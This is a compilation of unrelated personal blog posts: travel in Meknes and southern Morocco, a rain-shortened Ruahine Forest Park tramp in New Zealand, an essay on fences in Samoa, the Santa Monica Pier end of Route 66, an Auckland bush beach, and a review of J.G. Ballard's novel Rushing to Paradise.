that are occupied by gardened grand palaces and large administrative buildings. It is divided into three complexes, with Dar el-Kebira and Dar el-Makhzen being of the greatest interest.</p>    <p>Dar el-Kebira, a complex that Ismail had built for himself, contained dozens of rooms that were linked via a tangle of alleys, is now in relative shambles and the remains have been divided into shanties. It is entered through a large plaza that contains some interesting souks, especially the interesting spice, olive and date souks. Beyond that is a long street containing a medina beginning with a large selection of clothing, shoes and toys, followed by food and then fabrics, before it gradually peters out into homes and shops.</p>    <p>The remnants are Ismail&#x2019;s mausoleum, a mosque, a pavilion and a large gate marking the complex&#x2019;s entrance:</p>    <ul>     <li>The mausoleum of Moulay Ismail, a three-room suite built in the 17<sup>th</sup> century for Ismail, his wife and his son with burial chamber, a carved and painted door, a star-shaped fountain and all decorated with Zellij tiles.</li>     <li>The mosque (Lalla Aoida), built in the late 17<sup>th</sup> century;</li>     <li>The pavilion (Koubba el-Khayatine) originally used to receive diplomats (seeking to pay ransoms to win the freedom of Christians) and especially the vast complex of underground dungeons in which Christians and other political prisoners were held and tortured.</li>    </ul>    <p>The district also had its own Jewish quarter. While the Jews have left, there is still a Jewish cemetery and a school and synagogue that used to educate students from all across northern Africa.</p>    <p>Dar el-Makhzen, which is dominated by a monumental gate (Bar el-Makhzen), is divided into eight parts&#x2014;each of them is of massive scale. A few of these are accessible to the public, including</p>    <ul>     <li>Water storage basin that collected water from aqueducts to irrigate the gardens and supply water for the residents;</li>     <li>Water House with 15 barrel-vault-roofed rooms with horse-driven water wheels to pull water from underground;</li>     <li>Grain stables which, before its roof collapsed in the 1755 earthquake, were temperature controlled to keep the grain from spoiling.</li>    </ul>    <p>We then had a huge, good three-course lunch (not by choice, but it seems that meals tend to be multi-course) at Restaurant Salma, beginning with bread, olives, white beans, lentils and eggplant. Joyce had the Western menu, beginning with an omelet, then some good lamb kefta with rice and French fries, and finishing with cr&#xe8;me caramel. Tom had the Moroccan lunch, beginning with a Moroccan salad (tomato and cucumber salad, marinated carrots and more eggplant), pigeon pastille (one of the better pastilles we have had), followed by a selection of fruit.</p>    <p>After lunch, we stopped at a shop, L&#x2019;Art des Villes Imperiales, that had a nice display of local art, Berber jewelry and rugs and especially a display showing the making of Damasscine, consisting of an <b>iron</b> substrate into which lines are scratched and silver threads are hammered in.</p>    <p>&#xa0;</p>    <p><b>The Drive to Southern Morocco: From Meknes to Erg Chedi</b></p>    <p>Our next major stop was the massive sand dunes of Erg Chebbi. Reaching this destination, however, required our driver Moha to engage in one of his assigned labors: drive the roughly 500 kilometers to our next destination.</p>    <p>Since we didn&#x2019;t leave Meknes until late afternoon, we could only make it partway to the Southern Moroccan dunes. We passed a number of beautiful overlooks, went through a UNESCO-listed cedar forest and passed the home (but did not see any of the residents) of a tribe of Barbary Apes from which those of Gibraltar came.</p>    <p>We spent the night in the town of Midelt, a rather nondescript former garrison town for the French Legion that is located between the Mid Atlas and High Atlas mountains. Our was claimed to be the best in town, but was 1 star at the most. Our included unappetizing-looking buffet dinner (it was the only option we had) contained dry tough chicken, fresh cucumbers, beets, some breads, fruit. The fruit and the cucumbers were the best part as we essentially limited ourselves to the Moroccan equivalent of a salad bar. Along with a bottle of nondescript, non-vintage CP Cabernet. Breakfast buffet had bread, coffee, tea, juice and&#xa0;hard boil eggs. Thank goodness it also had yogurt and cereal. No fruit. It was at the same poor quality level as dinner. Surprisingly, we slept better than we thought we would on the big pillows and hard bed.</p>    <p>Although the hotel had little to recommend itself, it did have a nice display&#x2014;including in the rooms in the form of bathroom counter, bedside table and desktops&#x2014;of local fossil art, polished stones that highlight fossils from the days when this land lied beneath the sea. We were told that this was the best hotel in town. Probably, but still not a place we&#x2019;d ever recommend.&#xa0; At least it had intermittent wifi in the lobby (meaning it only worked if not too many others were trying to use it).</p>   </div>   <div>    January 4th, 2016 | Tags: , , , , , | Category:   </div>  </div>

   <div>   <p>Honestly, who would have thought it&#x2019;d be rainy fogged-in weather on <em>Labour Weekend</em>? Apparently not us, because we had a fairly intensive tramp planned that would have gone from Rangiwahia over to Howletts, then back via Iron Gates. Unfortunately it rained and it snowed and it didn&#x2019;t really work so well, but it was still worthwhile and from a personal perspective, I was still able to see places I hadn&#x2019;t seen before.</p>   <div>    Steve, Amanda and Paul north-west of Mangahuia.   </div>   <p><strong>Dates:</strong> 24th &#x2013; 26th October, 2008 (one day shorter than intended) <strong>Location:</strong> Ruahine Forest Park, Rangiwahia to Heritage Road-end. <strong>People:</strong> Steve, Amanda, Paul and me. <strong>Huts visited:</strong> Rangiwahia Hut (1 night), Triangle Hut (0 nights), Iron Gates Hut (1 night), Heritage Hut (0 nights). <strong>Intended Route:</strong> Walk to Rangiwahia, then around Maungamahue and the back of Te Hekenga , over to Taumataomekura, Teraha and to Howletts Hut for Saturday night. Then via Daphne Ridge, Otumore and down to Iron Gates Hut (or possibly Triangle Hut) for Sunday night, before heading back up to Rangiwahia Hut and out again on Monday. <strong>Actual Route:</strong> Due to weather issues we went straight down to Triangle Hut and Iron Gates Hut on Saturday, before continuing to the Heritage road-end on Sunday and getting out a day early. []</p>   <div>    This post is a    <em>trip report</em>. You can find other trip reports about other places linked from the , or by browsing the .   </div>   <p>After dinner from that Kebab shop at Bulls, we reached the Rangiwahia road-end at around 9.30&#x2019;ish, I guess. At the very least, after the walk up the hill (which from past experience seems to take about 90 minutes), we were settling down at around 11pm on Friday night. The weather forecast was already dismal, without much suggestion that things would clear up until about Monday. Although we&#x2019;d made plans to sleep in, Steve was still up and about at 6.30, and everyone followed.</p>   <p>There was some teasing clarity in the horizon to the west, with Ruapehu clearly visible, but we were slightly more concerned about an incoming southerly. The rest of the range to the east of Rangiwahia was already clagged in &#x2014; getting around the back of Te Hekenga and down to Howletts on the far side wasn&#x2019;t an enticing thing, especially since it was likely to just be cold and clouded-in all day. Instead, we thought we might try starting the plan in reverse, in the hope that the rivers wouldn&#x2019;t be up too much to interfere. So, after a casual breakfast, we packed up and left at 8am.</p>   <div>    Steve, Amanda and Paul heading towards the spur above Triangle Hut on Saturday morning.   </div>   <p>It took about an hour to reach the ridge just north of Mangahuia, which seems consistent with the previous three times I&#x2019;d been there. Looking over the edge, broken slabs of icy snow were still settled below us on the eastern side, making for an eerie walk through a fairly cold wind. Within about 30 minutes we were walking down the spur towards Triangle Hut, budgeting on being there for lunch. With the route down the spur quite slippery and covered in tussock, we were still on the tops until a little after 10am. From there we reached the relatively good track through the trees, arriving at Triangle before 11.</p>   <div>    Paul crossing part of the Oroua River outside Triangle Hut.   </div>   <p>Despite the rain, the northern branch of the Oroua River outside Triangle Hut wasn&#x2019;t flooded, although it was more full than it would often be. The first half of the walk to Iron Gates Hut (sometimes called Iron Gate Hut) is in this river, and the last few minutes requires getting over the <em>main</em> part of the Oroua River. Consequently, what we saw outside Triangle Hut did cause us to carefully consider whether we should be going any further. By the end of it, I think I was the last person being annoyingly indecisive, but we came to the consensus that the fact that it wasn&#x2019;t flooded would mean that the main part of the Oroua River down-stream wouldn&#x2019;t be flooded either. If we really got stuck somewhere, we at could at least fly-camp in the rain along the way until the river became safer. Besides, I&#x2019;ve been at Triangle Hut when it&#x2019;s raining a lot before, and if you really feel like going somewhere, the idea of potentially being trapped behind flooded rivers on all sides the next day really didn&#x2019;t appeal. At around midday, we set off south along the river towards Iron Gates Hut (often referred to as Iron Gate Hut, although the signs in the area seem to call it Iron Gates).</p>   <p>The river along here can be slightly gorgey, but in these conditions we always found reasonable crossing points that were rarely higher than knee-deep. There were a couple of minor areas where the current was uncomfortably strong, and it definitely helped to have someone nearby on firmer ground to use as support. At ten past one, we reached the end of the track leading over point 1037, to the other side where Iron Gates Hut is located. The first few minutes of this track follows a small stream up a gully, but it soon turns into a track of its own which is steep in some places, and without a lot of good hand-holds. It didn&#x2019;t feel particularly un-safe, though, within reason at least.</p>   <div>    Steve and Paul at the southern end of the track to Iron Gates.   </div>   <p>On the southern end, this track crosses one side-creek before sidling along a hillside above some nice waterfalls (down which I was glad we didn&#x2019;t need to climb), before landing at the main part of the Oroau River. As we expected, this river also wasn&#x2019;t flooded, but seeing it was enough to prompt me to put my camera away for a while. In hindsight I&#x2019;m really glad that I did.</p>   <p>The current was quite strong, but after some surveying and brief experimentation up and down the river, we eventually found a place we could cross reasonably comfortably. This was relief for me, because I&#x2019;d had in the back of my mind that we might become stuck somewhere between the two huts and have to camp out&#x2026; which is why both Amanda and I were both slightly surprised when Steve, who&#x2019;d been here recently, hopped straight back in the river a little further down and led us back to the side we&#x2019;d started from. Iron Gates Hut was still a few minutes along the river, and it seemed that there wasn&#x2019;t a clear route to it without a couple of extra crossings.</p>   <div>    Amanda watching Steve testing part of the river near Iron Gates.   </div>   <p>We were able to continue along the river-side for a few more minutes, but finally reached a point where some fast-moving rapids combined with an apparently gorgey rock-face on our side. It looked do-able to get around, but we just might get a bit more wet than we were already. In the distance on the far side of the river, we could see smoke wafting from the trees, indicating that there was someone home.</p>   <p>Steve was the first to lower himself down into the pool, which had a convenient ledge below it, and work his way around the edge of the rock-face. I followed, and soon found I couldn&#x2019;t see Steve ahead of me. Leaning backwards turned out to be a bad idea because I started floating on my pack and drifting away from the rock-face. It worked out fine, though, because Steve was grounded just around the corner and held out a hand to pull me in. Amanda and Paul followed, and the four of us now found ourselves standing in a small in-set into the rock on the far side of the river. Getting over to the far side from here was a challenge, but we managed it with the help of Steve (again) who anchored himself somewhere in the middle so as to help pull everyone past him and out the other side. <em>That</em> was an experience.</p>   <p>As we approached Iron Gates Hut at about 3pm, maybe in some kind of jovial mood, we met the three current occupants as we searched for dry clothing. The two Oringi Raincoats hanging outside suggested some kind of strong outdoor affiliation before we&#x2019;d even met them (that&#x2019;s my current theory, anyway), and it turned out they&#x2019;d come down from Auckland for the long weekend as an expedition on behalf of the . Earlier on Saturday the three of them had walked in from Heritage Lodge. I think their original plan had been to walk up further to Triangle, then up to Rangiwahia and out that way, but by the time we&#x2019;d arrived it sounded as if they were now intending to return the way they came &#x2014; probably due to weather. They had a nice fire going and were busy drying some of their things&#x2026; presumably things that hadn&#x2019;t been well stashed underneath their impressive raincoats. Steve, who had been starting to feel sick-ish, hopped up to one of the top bunks for a snooze. Amanda, Paul and I settled into the accommodation for the rest of the afternoon, with myself catching up on some reading before Amanda became the central figure in preparing a nice pasta and vegetable dinner.</p>   <p>It rained in patches overnight, sometimes intensively, although the river had actually gone <em>down</em> when I went out to check it on Sunday morning. Specifically, it&#x2019;d gone down by about 3 centimetres in the wide, wave-prone section that I&#x2019;d been using to wash the dishes the night before. Looking up to the tops, however, they still didn&#x2019;t look at all inviting. They&#x2019;d received more snow overnight, which boded for a potentially long and quite hard next couple of days. According to the plan, we&#x2019;d still need to be getting up to Howletts, which would probably take at least 6-7 hours in the conditions and wouldn&#x2019;t be very scenic. That would be followed by a long day of walking on Monday, probably at least 10 hours, and then a long, late and tiring drive back to Wellington on Monday night. Steve&#x2019;s condition, which seemed to have become more doubtful overnight, was also a convenient excuse for us to not bother trying.</p>   <p>There were a couple of other options we thought about. One was to go back the way we&#x2019;d come, past Triangle and then either head straight back to Rangiwahia for Sunday night, or down to Pourangaki or Kelly Knight (perhaps more interesting). Neither seemed that inviting, and with the Oroua River still flowing quite strongly it would have been more difficult to walk up against the current. We&#x2019;d definitely need to be looking for different crossing points from what we&#x2019;d used the day before. The LINZ map also indicates another track heading up a spur towards Rangiwahia from about the half way point between Iron Gates and Heritage, but Steve&#x2019;s attempt to come down this on another occasion several months before had suggested that it actually wasn&#x2019;t much of a track at all, and may actually have been densely overgrown. So in the end, we reached another consensus decision to simply walk to Heritage Lodge (near a road-end), and to figure out some way to get back to the van once we arrived.</p>   <div>    Nearing Heritage Lodge.   </div>   <p>We left Iron Gates Hut at 8.45am, saying goodbye to the Toi Toi Trekkers who&#x2019;d been waiting in bed while we packed up. It was a nice bush-walk through the rain, with a few undulations and a couple of crossings of side-creeks, but ultimately easily do-able. During one of our brief stops at 11.15am, we could see Heritage Lodge in the distance. 20 minutes later, having followed the sidling track around the hillside, we were there, and immediately greeted by two very friendly chaps from the Manawatu Branch of the . It was still raining, and although the sun almost emerged from time to time, it continued to tease us.</p>   <div>    The luxurious section of Heritage Lodge, reserved for NZDA.   </div>   <p>Heritage Hut (sometimes called Heritage Lodge) is an NZDA-built facility. An old lodge on the site burned down in 2005, apparently after some visitors let the fireplace get too hot and then packed up and left. <em><strong>[Edit 9-July-2010:</strong> There&#x2019;s another side to this story .<strong>]</strong></em> It&#x2019;s since been re-built by predominantly NZDA volunteers, with the help of many sponsors. The new facility is a fantastic lodge. The NZDA guys had a warm fire going and offered us hot water for a cuppa as we walked up, which was a great way to say hello. They were also keen to show off the features of the lodge, which we continued to take in as we settled down for an early lunch. For the record, anyone who thinks that kiwi hunters always like it rough needs to take a look in the private NZDA section of the lodge (NZDA permission would be required), which comes complete with a mini-kitchenette and a shiny shower cubicle. So much for the whole lowering-your-standards philosophy of the outdoors.</p>   <p>The other people we met at Heritage were a couple from the , who&#x2019;d walked up the track from the road to survey the area for a potential club trip they were planning in the near future. They were very friendly and helpful, and ultimately we were able to arrange for Amanda to walk back to their car with them, and then for them to drop her off at the Rangiwahia road-end to collect our van. The three of them left at about 12.15, with a loose arrangement that Paul, Steve and I would follow about an hour later. With nothing much else to do, Steve found a bunk to lie on for another daytime nap, while Paul and I chatted with the NZDA people and browsed the hut literature.</p>   <div>    Steve at the Heritage road-end.   </div>   <p>The remaining walk back to the Heritage road-end almost feels as if it&#x2019;s a vehicle track in some places, and having left at 1.30pm and moving at a very relaxed pace, we were at the fence bordering Ruahine Forest Park about 20 minutes later. The timing was good and Amanda drove up at about 2.15pm, just as we&#x2019;d begun to walk down the road. As Steve pointed out, leaving on Sunday instead of Monday (Labour Day) had the added advantage of us not having to pay a surcharge at the cafe in Kimbolton, where we stopped for a decent second lunch.</p>   <p>With breaks in the weather emerging, we could now clearly see the freshly snow-capped mountain range over which we <em>might</em> have been walking if the weather had played more nicely earlier in the day, but I guess on this occasion it wasn&#x2019;t to be. We really needed two days of good weather to have carried out the original plan and for it to be worthwhile. Attempting it in reverse also complicated things further by putting the longest day of walking on the same day we wanted to drive home, and the uncertainty of exactly how this would pan out was a significant factor in us deciding to get out early. I still got to visit several places I haven&#x2019;t been, however, and we&#x2019;ll probably get another chance to try it again in the future.</p>   <div>    What the storms left behind.   </div>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
   <div>   <p>I have a fence again. It&#x2019;s made of chainlink and it has lines of barbed wire running along the top of it. It&#x2019;s posts are firmly grounded in boxed concrete so that dogs and pigs and pesky chickens cant dig their way under it. There&#x2019;s a gate with a padlock and every time I drive my car in or out, I have to stop and get out to unlock the gate and swing it wide open.&#xa0; It&#x2019;s annoying, especially when its pouring with rain,&#xa0;and I wish I were wildly rich and could afford an automatic gate with a remote control so I could zap my gate open and closed. But still, it&#x2019;s a gate and it&#x2019;s a fence and I like it.</p>   <p>When people&#xa0;from far away&#xa0;think&#xa0;about Samoa, they don&#x2019;t think of fences and <b>gates</b>. They muse upon postcard pictures of white sand beaches and scuba diving in azure waters. They reminisce in Samoa chatrooms about how much they miss the islands (that they&#x2019;ve never actually lived in. But their parents did. And maybe they&#x2019;ve come to visit.) and the &#x2018;<em>communal</em> <em>living&#x2026;where everyone shares&#x2026;and life is much slower and easier&#x2026;because you don&#x2019;t have to work as hard&#x2026;you can just grow some taro and live off the land&#x2026;together with your aiga&#x2026;everyone helping each other&#x2026;</em>&#x2018; There&#x2019;s no fences in those golden visions of Samoa. There&#x2019;s no mangy dogs that bite you or child vendors selling air freshner outside McDonalds in these visions either. But hey, we all need our golden fantasies, don&#x2019;t we?</p>   <p>Sure, lots of folks in Samoa <strong><em>don&#x2019;t</em></strong> have fences. Lots of folks <strong><em>do</em></strong> live in villages with one family&#x2019;s cookhouse bordering on another&#x2019;s. I don&#x2019;t know if life there is <em>&#x2018;easier&#x2026;happier&#x2026;slower&#x2026;better&#x2019;</em> because I don&#x2019;t live in a village like that. I live in Apia and I have a fence. Of course I&#x2019;m not the only one who has a fence. There&#x2019;s a neighbour up the road with a gleaming line of chainlink all around their tiny faleo&#x2019;o. Its clear they have their priorities straight. Like us, they built their fence first before building a house. Unlike my yard which is a barren wasteland, they also have carefully nurtured hibiscus hedges and rows of colourful flowers in their garden.&#xa0;When we lived up the mountain last year, our neighbour had a massive cement wall surrounding their&#xa0;luxurious home. At the top of this wall was some decorative trim that caught the sunlight and sparkled. &#xa0;It took me several weeks to realize that&#xa0;it was thick triangular shards of glass, the size of my hand, wedged into the concrete and pointing skywards.&#xa0;It was&#xa0;explained to me that there had been a break-in at that house and when the #ManOfTheHouse chased after the intruder &#x2013; he had been slashed with a knife. So post-breakin, the family had added the glass to their wall. Pretty <strong><em>and</em></strong> painful.</p>   <p>My fence&#xa0;makes me happy.&#xa0;During the daytime, I know Bella can&#x2019;t ride her bike on the road because the gate is locked. At night when the zombies and mass murders are most likely to be out &#x2013; my dog patrols our fence and I&#x2019;m reassured because while chainlink and barbed wire wont keep a zombie out for long, it should make enough noise trying to get over that I will wake up and have time to get my gun and blow it&#x2019;s head off from 20m away. (of course I need to buy a gun by then. And take some lessons so I can be a sniper worthy of Call of Duty.) In the meantime, my&#xa0;fence makes me feel safer than if I didn&#x2019;t have a fence.</p>   <p>It&#xa0;also means that unlike when we lived in New Zealand, &#xa0;I wont have random people knocking on my door when I don&#x2019;t want them to. No more rambling conversation from the drunken lady who lived in her van parked in front of the neigbor&#x2019;s house and who wanted to chat at least once every two days. No more cringing inwardly and making up excuses for the door sales reps as to why you can&#x2019;t buy a&#xa0;security system&#x2026;new tires&#x2026;or donate to dig&#xa0;wells for poor people in some distant&#xa0;nation. &#xa0;New Zealand was a nice country and had lots of nice things (like Boston Cream donuts, really crisp apples, cauliflower that didn&#x2019;t cost $35 for one, and schools with lots of playgrounds and teachers who didn&#x2019;t yell at small children and make them cry.) But NZ didn&#x2019;t have chainlink fences. At least not in West <b>Auckland</b>. And I really missed my fence. I&#x2019;m glad to be home in Samoa and to have a fence again.</p>   <p>So next time you&#x2019;re envisioning the wonders of the paradise that is Samoa? Yes, dream of beaches and harmonious idyllic villages. But also add in some fences. <b>Gates</b>. Barbed wire. A few concrete walls with decorative glass shards. Because we have those in Samoa too.</p>   <p>&#xa0;</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
   <div>   <p>We had been on the road for eleven days before we reached the beginning of the Route 66 leg of our nineteen-day trip. We left Oxnard, California, on a Thursday morning and drove down California Highway 1 awed by scenic ocean views, through Malibu where homes of the rich and famous were blocked from view by lush landscaping and <b>iron</b> <b>gates</b>, to Santa Monica.</p>   <h2>The beginning&#x2014;or is it the end?</h2>   <p>The Santa Monica Pier is usually considered the end of Route 66, and we&#x2019;d usually agree, but circumstances had us working our way west to east rather than east to west on this trip. Our first stop was the visitor center kiosk in Palisades Park for photo ops with &#x201c;West End of Route 66&#x201d; signs.</p>   <p>But we thought Route 66 actually ends at the pier, which we could see in the distance as we walked through the park to the edge of the sandstone bluffs.</p>   <p>So we hoofed it to the pier, and sure enough, there were more &#x201c;End of Route 66 signs.&#x201d; I&#x2019;ve found out since our trip that there&#x2019;s a brass plaque somewhere that marks the true end, which we didn&#x2019;t see.</p>   <h2>A little history lesson</h2>   <p>The pier was built in 1909, had seen an amusement park and a ballroom come and go before Route 66 was extended to Santa Monica in 1936. The only ride that remained from the amusement park at that time was the carousel. However, a yacht harbor was created in 1934, two years before Route 66 was extended.</p>   <p>The pier was set for demolition in the 1970s, but locals protested and passed Proposition 1, an initiative to preserve the pier forever.</p>   <p><span><strong>Don&#x2019;t miss a U.S. Long Cuts post.&#xa0; For a FREE subscription, enter your e-mail address in the Subscribe to U.S. Long Cuts box in the upper right and click Subscribe.</strong></span></p>   <p>In 1983 much of the pier was destroyed by a winter storm. It was ready for rehabilitation anyway, so they were able to start with a clean slate.</p>   <h2>Santa Monica Pier today</h2>   <p>The carousel building, the Hippodrome, is the original built by Charles Looff in 1916. The carousel inside, a 1922 Philadelphia Toboggan Company carousel, has been there since 1947. The building also holds a soda fountain.</p>   <p>Restaurants, an arcade and an amusement park line the south side of the pier. On the north side, overlooking the beach, vendors sell souvenirs and snacks, street performers entertain, and caricature artists will create an exaggerated likeness of you.</p>   <p>We visited on a weekday morning, and the pier was bustling. It would have been fun to ride the Ferris wheel in Pacific Park or take a spin on the carousel, but we still had a lot of road to travel that day. We had only eight days to explore what we could at the western side of Route 66.</p>   <p>The Santa Monica Pier is a great way to celebrate the end of your Route 66 journey if you&#x2019;re driving east to west or the beginning of your west-to-east drive.</p>   <p><span><strong>For travel information about the U.S. Midwest, be sure to check out our </strong></span><span><strong> blog, too.</strong></span></p>   <p>The is located off of Colorado Avenue and Ocean Avenue in Santa Monica, California.

   <div>   <p>The one thing I missed most about NZ when I was living in the UK is this.</p>   <p>The long hot Kiwi summer.</p>   <p>I know it&#x2019;s not always hot, and it was actually hotter in my memories of the late 1970s, but even so, just having the freedom to not do much and just hang out at the beach over the lazy school holiday months of December and January is wonderful.</p>   <p>In the past I&#x2019;ve taken the kids on the annual pilgrimage to the Coromandel beach of Whangapoua in late January when the weather is warmer and often more reliably hot, but this year we are both so busy with trying to get money in the door to pay for everything we haven&#x2019;t stopped over Christmas and can&#x2019;t see stopping anytime soon.</p>   <p>I know we need a break though, so when invited us out to her family&#x2019;s bach about an hour&#x2019;s drive from home I leapt at the chance to accept. The kids were spending some time with their father so it was just my Englishman and I, and even then he tried to bale saying he couldn&#x2019;t spend the time away from the welding <b>iron</b>. So I did what good wives do.</p>   <p><em>I made him come along for the ride</em>.</p>   <p>I&#x2019;ve always held the view that the beaches south of Howick are not all that, and that it&#x2019;s the beaches north of the city that really stun, but when you&#x2019;ve been living overseas your eyes are suddenly opened to the beauty that really does exist here.</p>   <p>Rachel told us her family&#x2019;s bach was on land just passed KawaKawa Bay and her instructions were amusing.</p>   <p>&#x201c;Drive to the end of the coast road where it comes to an end and then keep on driving up the gravel track up the side of a cliff until you come to a gate that says &#x2018;Private Property.&#x201d;</p>   <p>Actually I think the gate said something like &#x2013; &#x2018;Come on in I can get to the gate quicker than you can&#x2019; with a picture of a savage looking dog. But she was right about the other things &#x2013; the cliff (check), the winding track (check), the great views of certain doom if you were to make a false steering move (check)&#x2026;.</p>   <p>I made my Englishman drive that bit.</p>   <div>    <p>Follow the yellow brick road&#x2026;or rather, dirt track</p>   </div>   <p>Nestled on the side of the bush clad hill was a cute little caretaker&#x2019;s cottage, a hippy chick&#x2019;s hideaway. I wanted to just stay there, write my great New Zealand novel and never leave. And with views like this from the deck can you blame me?</p>   <div>    <p>In between the verdant green of the bush flashed snippets of turquoise blue and the purple flowers of Agapanthus.</p>   </div>   <p>This is the<em><strong> real New Zealand</strong> </em>that tourists don&#x2019;t often get to enjoy, but I really think they should!</p>   <p>And this is what it sounds like, lest you think it&#x2019;s all calm and quiet. Apparently at dawn you can hear the Weka and the Kingfisher as well as the Tui and Bellbird. Then the cicadas start..</p>   <p>And just down the bush track there&#x2019;s this beach. A private beach. This. Is. The. Life.</p>   <div>    <p>The stunning beautiful and private beach at Tuturau</p>   </div>   <p>Even though Tuturau is privately owned there is a public beach and camping ground not far from here, which is only accessible at low tide. The New Zealand Department of Conservation, colloquially known as DOC runs the campsite there.</p>   <p>Check out if you&#x2019;re spending some time in NZ and can go bush!</p>   <p>This is the best way to experience New Zealand, with only a very basic camping ground, no mod-cons like flushing loos or hot water, but on the other hand you wake up to this:</p>   <div>    <p>Tawhitokino is only accessible at low tide and costs $6 per night.</p>   </div>   <p>Tawhitokino is also accessible by sea and is a stopping point for the Te Ara Moana sea-going pathway which follows the old Maori canoe routes around the coast of the Hunua Ranges. I must do that pathway one day.</p>   <p>How lucky are we to live so close &#x2013; even in New Zealand&#x2019;s largest city &#x2013; that we are only 60 kms away from this natural paradise?</p>   <p>As soon as the work is done I&#x2019;m intending on dragging my Englishman back here and going native for a couple of days. We could do with playing Adam and Eve for a bit.</p>   <p>********</p>   <p><strong><em>Where:</em></strong> Waiti Bay, Tawhitokino &#x2013; South of Auckland&#x2019;s urban area</p>   <p><em><strong>Why:</strong></em> For absolute get-back-to-nature &#x2018;peace&#x2019;</p>   <p><em><strong>Who:</strong></em> Tourists should come here to really get the spirit of New Zealand and our beautiful bush.</p>   <p><em><strong>How much:</strong></em> $6 per adult per night.

   <div>   <p>&#xa0;</p>   <p><em>(c) Flamingo Books</em></p>   <p>&#xa0;</p>   <p>I opened J.G. Ballard&#x2019;s 1994 novel <em>Rushing to Paradise</em> with a little trepidation because of two common assumptions about Ballard&#x2019;s oeuvre: firstly, that he was&#xa0;better at writing short stories than at writing novels; and secondly, that his earlier novels &#x2013; those up until 1984&#x2019;s <em>Empire of the Sun</em>, including the loose trilogies of <em>The Drowned World</em>, <em>The Drought</em> and <em>The Crystal World</em> (1964-1966) and <em>Crash</em>, <em>Concrete Island</em> and <em>High Rise</em> (1973-1975) &#x2013; are better than his later ones.</p>   <p>&#xa0;</p>   <p>Generally, I agree with both assumptions.&#xa0; While I think Ballard, who died in&#xa0;2009,&#xa0;wrote some excellent novels, none of them had quite the same impact on me that his best short stories did &#x2013; items like <em>Concentration City</em>, <em>The Drowned Giant</em>, <em>Now Wakes the Sea </em>and <em>The Air Disaster</em> are masterpieces of short fiction that aspiring young writers should be made to study in order to learn How It Is Done.&#xa0; And though I always got some enjoyment out of his later novels, such as <em>Super</em>-<em>Cannes</em> (2000), <em>Millennium</em> <em>People</em> (2003) and <em>Kingdom</em> <em>Come</em> (2006), it was clear that they weren&#x2019;t in the same league as his earlier novels.</p>   <p>&#xa0;</p>   <p>The problem with his later books, I feel, is that there&#x2019;s too much going on in them and as a consequence they lack focus.&#xa0; For example, <em>Kingdom</em> <em>Come</em>, which looks at the disturbing influence that a huge new shopping mall has on the inhabitants of a satellite town outside London, begins with a shooting spree by a crazed gunman, then touches on several contemporary issues like racism, football hooliganism and rampant 21<sup>st</sup>-century consumerism, and ends with a bizarre final section where an assortment of misfits take over the mall and try to set up a new (and inevitably dystopian) society inside it, like William Golding&#x2019;s <em>Lord of the Flies</em> or Alex Garland&#x2019;s <em>The Beach</em> crossed with the George A. Romero movie <em>Dawn of the Dead</em>.&#xa0; In other words, just as you&#x2019;ve managed to take one trope on board, another one bustles along to confuse you further.</p>   <p>&#xa0;</p>   <p>Sometimes I feel that this was due not so much to a decline in Ballard&#x2019;s writing powers, as to the fact that the modern world &#x2013; which all Ballard&#x2019;s work portrayed through a uniquely distorted prism, part Franz Kafka and part Salvador Dali &#x2013; was by the 21<sup>st</sup> century changing so fast.&#xa0; Even his satirical radar couldn&#x2019;t keep up with all the weird social, political and technological developments that contemporary life was generating.&#xa0; Neither could he quite manage to accommodate everything adequately in each new book.</p>   <p>&#xa0;</p>   <p>(Having said that, I should thank <em>Kingdom</em> <em>Come</em> for a memorable <em>frisson</em> it gave me last year, while I was reading it.&#xa0; I&#x2019;d arranged to&#xa0;meet a friend one afternoon in Carthage, the swankiest of Tunis&#x2019;s suburbs.&#xa0; My friend hadn&#x2019;t yet turned up when I got off at the local TCM station, which was&#xa0;next door to the Carthage Branch of Monoprix, so I took <em>Kingdom Come</em> out of my bag and spent a few minutes waiting beside the big supermarket with my nose stuck in its pages.&#xa0; It took me a minute or two to realise that&#xa0;the supermarket wasn&#x2019;t just closed for&#xa0;the afternoon.&#xa0; It was gutted.&#xa0; During the Tunisian revolution in January, it&#x2019;d been looted and trashed and stood now as a razed shell, a disturbingly incongruous spectacle in the middle of this smart neighbourhood of high white walls and thick <b>iron</b> <b>gates</b>, four-by-fours and swimming pools, orange trees and jasmine bushes.&#xa0; This&#xa0;was all spookily&#xa0;similar to what was happening in&#xa0;the book I was holding &#x2013; wow, the prophetic power of literature!&#xa0; If Ballard&#x2019;s ghost had been nearby, having a quiet chuckle, I wouldn&#x2019;t have been surprised.)</p>   <p>&#xa0;</p>   <p>A plot summary of <em>Rushing</em> <em>to</em> <em>Paradise</em> suggests a similar lack of focus.&#xa0; It tells the story of a group of environmental activists, led by an intense and plainly unbalanced woman called Dr Barbara Rafferty, who head for Saint Esprit, a Pacific atoll, to protest against a French nuclear test and save the albatrosses that nest there.&#xa0; By dumb luck rather than by any tactical ability, they manage to force the French to withdraw from the atoll and, with the place to themselves, Barbara hits on the idea of converting it into a global eco-sanctuary, one where endangered plants and animals can brought from other continents and allowed to grow or breed in safety.&#xa0; &#x201c;Think of Saint Esprit as the ultimate environmental project,&#x201d; she tells the youngest member of the group, a na&#xef;ve 16-year-old called Neil Dempsey who is the novel&#x2019;s focal character and whose loyalty to Barbara strays further into psychosis as the story progresses.&#xa0; &#x201c;We&#x2019;re engineering the ecology of paradise!&#x201d;&#xa0; Needless to say, things don&#x2019;t go as planned and the utopian society that the environmentalists set up on Saint Esprit falls more than slightly short of its goals.&#xa0; In fact, it all goes <em>Lord of the Flies</em>. &#xa0;(That happened a lot in Ballard&#x2019;s fiction.)</p>   <p>&#xa0;</p>   <p>Later, however, Ballard shifts gears and what had been a dark satire of environmental idealism becomes an even darker satire of feminism.&#xa0; Barbara starts to muse that, &#x201c;Women don&#x2019;t dislike men&#x2026; We bring them into this world and spend the rest of our lives helping them to understand themselves.&#xa0; If anything, we&#x2019;ve been too kind to them, letting them play their dangerous games.&#x201d;&#xa0; Meanwhile, the male members of the party start dying of strange, debilitating sicknesses.&#xa0; And whenever boatloads of environmental sympathisers arrive at the atoll, the women on board are persuaded to stay while the men go mysteriously missing.&#xa0; It eventually dawns on Neil that Barbara is keeping him alive so that he can impregnate the women around him and the atoll can propagate what she has identified now as the most valuable species of all &#x2013; the human female.&#xa0; And if anything happens to compromise Neil&#x2019;s fitness and virility, he&#x2019;ll go the same way as the other men.</p>   